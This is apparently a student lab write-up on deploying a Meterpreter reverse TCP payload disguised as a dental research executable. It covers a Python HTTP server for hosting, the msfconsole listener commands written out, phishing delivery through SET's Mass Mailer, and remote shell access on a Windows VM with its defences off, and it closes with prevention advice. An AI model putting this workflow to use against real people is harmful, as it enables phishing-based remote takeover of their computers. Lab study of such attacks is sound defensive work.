***DISCLAIMER:*** *This is intended for ethical hacking educational purpose. Performing hacking attempts on any computers that you do not own (without permission) is illegal! Do not attempt to gain access to devices that you do not own!*

# <div align="center"> Payload Deployment</div>

## Introduction

In the ever-evolving landscape of cybersecurity, understanding and demonstrating the methods of payload deployment is crucial for both offensive and defensive strategies. This project delves into the intricate process of creating and deploying a reverse TCP payload using msfvenom, specifically within the context of a simulated social engineering attack. The objective is to illustrate the vulnerabilities that can be exploited through carefully crafted pretexts and technical methodologies.

***Overview***

The selected payload, a reverse TCP payload, is tailored for a scenario involving a fictitious dental research organization, "Advanced Dental Practice." This payload is designed to be embedded within an executable file named "AdvancedDentalResearchFindings.exe," which masquerades as a legitimate document applicable to dental research. The primary aim is to gain remote access to a target machine, thereby exposing the vulnerabilites that can be leveraged via social engineering tactics.

## Choice of Payload

- ***Payload Selection:*** A reverse TCP payload using msfvenom
- ***Objective:*** To achieve remote access to the target machine, demonstrating the vulnerabilites exploited through social engineering

## Emulation Setup

***Lab Enviroment Configuration:***

- ***Attackers VM:*** Set up Kali Linux VM to serve as the attacker's machine. This VM will be used for creating the payload with msfvenom, hosting it using the Python's HTTP server, and sending the phishing email via SET's Mass Email Attack feature.
- ***Target VM:*** Configure a Windows VM as the target for receiving the phishing email and accessing the payload.

***NAT Network Configuration:***

- Kali Linux (Attacker) and Windows (Target) VMs should be configured to use a NAT network. This setup allows the VMs to share the host machine's internet connection while isolating them from the host's network and each other. 

***Disabling Windows Security Settings (for lab demonstration purpose):***

- Turn off all security settings on the Windows target VM, including Windows Defender and any installed antivirus programs. This step is essential to allow the payload to execute without being blocked or flagged by the systems's security measures.
- Navigate to Windows Security settings and turn off features like real-time protection, cloud-delivered protection, and automatic sample submission to prevent the system from intercepting the payload.

***Payload Hosting on Attacker VM:***

- Host the "AdvancedDentalResearchFindings.exe" payload using Python's HTTP server.

  ```Python3 -m http.server 8000```

- The payload is now accessible through the attacker's VMs internal IP address on the NAT network.

***Listener Setup on Attacker VM:***

- Open msfvonsole on the Kali Linux VM and configure a listener for a reverse TCP connection

  ```Use exploit/multi/handler```

  ```Set payload windows/meterpreter/reverse_tcp```

  ```set lhost 192.168.100.4```

  ```set lport 5555```

  ```run```

- This configuration listens for the reverse TCP connection from the payload executed on the target machine.

***Payload Delivery via SET:***

- Use the Social Engineering ToolKit (SET) within Kali Linux VM to conduct a Mass Email Attack, sending a phishing email containing a link to the hosted payload ("AdvancedDentalResearchFindings.exe").
- The email being crafted aligns with the pretext scenario, making it appear to be legitimate communication related to dental research.

***Execution on Target VM:***

- The user on the Windows VM receives the phishing email.
- Upon clicking the link and executing the downladed file, the Windows VM initiates a reverse TCP connection to the Kali Linux VM.

## Step-by-Step Deployment

***Payload creation with msfvenom***
<div align="center">Create the reverse TCP payload using msfvenom</div>
<p align="center"><img src=images/Picture1.png></p>

---

***Use Python to create HTTP server to host the payload***
<p align="center"><img src=images/Picture2.png></p>

---

***Setup a listener using msfconsole***
<div align="center">Run msfconsole</div>
<p align="center"><img src=images/Picture3.png></p>
<div align="center">Use exploit/multi/handler</div>
<p align="center"><img src=images/Picture4.png></p>
<div align="center">Use show options command to display options required</div>
<p align="center"><img src=images/Picture5.png></p>
<div align="center">Set payload windows/meterpreter/reverse_tcp</div>
<p align="center"><img src=images/Picture6.png></p>
<div align="center">Use show options command to display required payload options</div>
<p align="center"><img src=images/Picture7.png></p>
<div align="center">Set lhost to 192.168.100.4 (Attacker VM IP)</div>
<p align="center"><img src=images/Picture8.png></p>
<div align="center">Use show options to display updated payload options</div>
<p align="center"><img src=images/Picture9.png></p>
<div align="center">Set lport to 5555 (port used in the payload)</div>
<p align="center"><img src=images/Picture10.png></p>
<div align="center">Use show options command to display updated payload options</div>
<p align="center"><img src=images/Picture11.png></p>
<div align="center">Run the exploit</div>
<p align="center"><img src=images/Picture12.png></p>

---

***Use The Social-Engineer Toolkit (SET) to send the payload to target***
<div align="center">Run SET and select option [1] Social-Engineering Attacks</div>
<p align="center"><img src=images/Picture13.png></p>
<div align="center">Select option [5] Mass Mailer Attack</div>
<p align="center"><img src=images/Picture14.jpg></p>
<div align="center">Select option [1] E-Mail Attack Single Email Address</div>
<p align="center"><img src=images/Picture15.png></p>
<div align="center">Select option [2] One-Time Use Email Template</div>
<p align="center"><img src=images/Picture16.png></p>
<div align="center">Fill in all the information for the email</div>
<p align="center"><img src=images/Picture17.png></p>

---

***Target View***
<div align="center">Email inbox view of target</div>
<p align="center"><img src=images/Picture18.png></p>
<div align="center">Email view with payload attached</div>
<p align="center"><img src=images/Picture19.png></p>
<div align="center">Target view after clicking link</div>
<p align="center"><img src=images/Picture20.png></p>
<div align="center">Pop-up message displays when clicking the download file indicating that the file is harmful. For this demonstration, we will select keep</div>
<p align="center"><img src=images/Picture21.png></p>
<div align="center">Next select open file</div>
<p align="center"><img src=images/Picture22.png></p>
<div align="center">Select Run</div>
<p align="center"><img src=images/Picture23.png></p>

---

***Attacker View***
<div align="center">Check listner in msfconsole for reverse TCP successful connection</div>
<p align="center"><img src=images/Picture24.png></p>
<div align="center">Use sysinfo to retrieve system information</div>
<p align="center"><img src=images/Picture25.png></p>
<div align="center">Use shell command to execute system commands directly on target machine</div>
<p align="center"><img src=images/Picture26.png></p>
<div align="center">Use whoami command to see user information</div>
<p align="center"><img src=images/Picture27.png></p>
<div align="center">Use dir command to view files on system</div>
<p align="center"><img src=images/Picture28.png></p>
<p align="center"><img src=images/Picture29.png></p>


## Preventative Measures

- ***Investigate Email Content and Sender:*** Be cautious of unsolicited emails, especially those with links or attachments. Verify the sender's credibility and be skeptical of unexpected requests or offers.
- ***Avoid Clicking Suspicious Links:*** Do not click on links in emails without verifying their authenticity. Hover over links to preview the URL and ensure it matches expected and known websites.
- ***Install and Maintain Antivirus Software:*** Ensure that reliable antivirus and anti-malware software is installed and updated on all devices.
- ***Implement Firewalls:*** Utilize network firewalls to block unauthorized access to your computer systems.
- ***Keep Systems Updated:*** Regularly update the operating system and all software, including browsers and email clients, to patch known vulnerabilities that could be exploited.
- ***Question Unexepected Requests:*** If an email asks for sensitive actions, like clicking a link or downloading a file, verify its legitimacy through alternative communication methods, such as calling the organization directly.
- ***Double-Check Before Downloading:*** Be cautious about downloading files from emails, especially executable files (.exe) or documents with embedded scripts. 

## Conclusion

This project provided parctical insights into alternative methods for payload delivery. Hosting the payload on a python server and then using a phishing email to link this payload demonstrated a versatile approach to overcoming email security barriers. Successfully configuring a NAT network for the VMs and intergrating various tools (msfvenom, python http server, SET, and msfconsole) displayed the complexity and adaptability required in successfully deploying a payload.

## Full Disclaimer

*Any action and or activities related to the material contained within this repository is solely your responsibility. The misuse of the tools and information in this repo could result in criminal charges being brought against the person in question. The author will not be held responsible in the event any criminal charges are brought against any individuals misusing the tools and information in this repository for malicious purpose or to break the law.*
